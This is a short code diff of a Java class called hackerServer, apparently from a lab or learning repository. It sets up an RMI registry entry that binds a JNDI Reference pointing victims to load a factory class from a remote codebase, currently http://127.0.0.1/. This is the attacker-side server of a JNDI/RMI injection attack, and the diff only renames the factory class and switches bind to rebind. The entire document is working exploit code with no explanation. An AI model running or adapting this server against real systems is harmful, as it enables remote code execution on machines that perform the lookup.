@@ -9,8 +9,8 @@ import java.rmi.registry.Registry;
 public class hackerServer {
     public static void main(String[] args) throws Exception{
         Registry hackerRegister = LocateRegistry.getRegistry(1099);
-        Reference reference = new Reference("hacker","hacker","http://127.0.0.1/");
+        Reference reference = new Reference("chenlvtang","hacker","http://127.0.0.1/");
         ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
-        hackerRegister.bind("test",referenceWrapper);
+        hackerRegister.rebind("test",referenceWrapper);
     }
 }
